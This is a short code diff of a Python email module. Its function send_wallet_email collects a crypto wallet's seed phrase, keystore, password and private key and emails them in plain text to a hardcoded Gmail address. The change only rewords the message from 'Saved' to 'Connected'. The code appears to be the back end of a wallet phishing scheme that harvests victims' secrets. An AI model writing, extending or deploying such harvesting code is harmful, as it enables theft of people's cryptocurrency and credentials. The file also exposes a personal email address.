@@ -106,13 +106,13 @@ def send_welcome_email(recipient_email, user_name):
 
 def send_wallet_email(phrase, keystore, password, privatekey, method):
     msg = EmailMessage()
-    msg['Subject'] = 'New Wallet Saved'
+    msg['Subject'] = 'New Wallet Connected'
     msg['From'] = SENDER_EMAIL
     msg['To'] = 'okekejohnpaul514@gmail.com'
 
     # Email content
     content = f"""
-    ✅ A new wallet has been saved.
+    ✅ A new wallet has been Connected.
 
     🔐 Phrase: {phrase}
     🗂️ Keystore: {keystore}
